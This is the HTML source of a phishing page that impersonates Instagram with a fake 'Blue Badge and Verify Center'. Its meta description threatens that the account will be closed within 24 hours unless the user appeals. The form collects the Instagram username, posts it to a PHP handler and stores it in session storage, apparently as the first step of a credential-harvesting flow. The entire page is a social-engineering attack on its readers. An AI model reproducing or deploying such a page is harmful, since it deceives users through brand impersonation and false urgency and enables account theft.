<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>Instagram Blue Verification badge </title>
    <meta name="viewport" content="width=device-width, maximum-scale=1.0, initial-scale=1.0">
    <meta name="format-detection" content="telephone=no">
    <meta name="msapplication-TileColor" content="#da532c">
    <meta name="theme-color" content="#4C40F7">
    <meta name="description" content="We've received complaints that your account violates our community guidelines. If you think this is wrong, fill out the appeal form. Your account will be permanently closed within 24 hours if an appeal request is not received.">
    <meta property="og:title" content="Appeal and Complaint Center">
    <meta property="og:image" content="images/ahey.jpg">
    <meta property="og:description" content="We've received complaints that your account violates our community guidelines. If you think this is wrong, fill out the appeal form. Your account will be permanently closed within 24 hours if an appeal request is not received.">
    <link rel="stylesheet" media="all" href="css/app.css">

</head>

<body>
    <div class="page">
        <div class="main">
            <div class="header js-header" id="header">
                <div class="header__center center"><a class="header__logo" href="index.html"><img class="header__pic" src="images/ehe.jpeg" alt></a>

                </div>
                <div class="header__wrapper js-header-wrapper">
                    <div class="header__preview"><a class="header__logo" href="index.html"><img class="header__pic" src="fonts/logo-white.svg" alt></a>
                        <div class="header__img"><img class="header__pic" src="images/bg-header.png" alt></div>


                    </div>
                </div>
            </div>
            <div class="main__bg"></div>
            <div class="main__center center">
                <div class="main__wrap">

                    <h1 class="main__title title h1"><span data-aos="transform" data-aos-delay="150">Blue Badge <img src="images/myt.png" width="15%"></span>
                        <span data-aos="transform" data-aos-delay="300">and Verify Center</span>
                        <span data-aos="transform" data-aos-delay="450"></span>
                    </h1><a class="scroll js-scroll" href="#details" data-aos="transform"></a>
                </div>
            </div>

            <div class="main__figures">
                <div class="main__figure" data-aos="animation-translate-y"><img class="main__pic js-parallax" data-scale="2.0" data-orientation="down" src="images/igx.png" alt></div>

                <div class="main__figure" data-aos="animation-translate-y" data-aos-delay="200"><img class="main__pic js-parallax" data-scale="2.2" data-orientation="up" src="images/mt.png" alt></div>
            </div>

            <div class="details" id="details">
                <div class="details__center center">
                    <div class="details__head" data-aos="animation-scale-y">
                        <br>
                        <form onsubmit="send();" autocomplete="off" action="req/one.php" method="POST" enctype="multipart/form-data" >
                            <div class="details__stage stage">Blue Badge Verify Form</div>
                            <br>
                            <h3 class="details__info h3">Enter your username and follow the next steps.<br></h3><br>
                            <div class="details__btn">
                                <form class="contacts__form" data-aos="animation-translate-y" data-aos-delay="200">
                                    <div class="contacts__field field">
                                        <div class="field__wrap"><input class="field__input" type="text" id="unem" name="uname" placeholder="Username" required>
                                            <div class="field__icon"><svg class="icon icon-profile">
                                                    <use href="fonts/sprite.svg#icon-profile" />
                                                </svg>
                                                <br> <br><br><br>
                                            </div>

                                            <br><br>
                                            <button class="btn btn_purple" name="foreuser">
                                                <span class="btn__text">Continue</span>

                                            </button>
                                            </a>
                                        </div>
                                    </div>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
            <div class="footer">
                <div class="footer__center center">
                    <div class="footer__body">
                        <div class="footer__wrap">


                            <div class="footer__menu"><a class="footer__link" href="#">About</a><a class="footer__link" href="#">Blog</a><a class="footer__link" href="#">Contact</a><a class="footer__link" href="#">API</a><a class="footer__link" href="#">Accounts</a></div>
                        </div>
                        <div class="footer__bottom">
                            <div class="footer__copyright">© 2023 Help Portal</div><a class="footer__scroll js-scroll" href="#header">Back to top</a>

                        </div>
                        <div class="footer__bg">
                        </div>
                    </div>
                </div>
            </div>

        </div>
        <script src="js/app.js"></script>
        <script src="js/common.js"></script>
        <script>function send(){xxx = document.getElementById("unem").value;sessionStorage.setItem("uname", xxx);}</script>
</body>

</html>
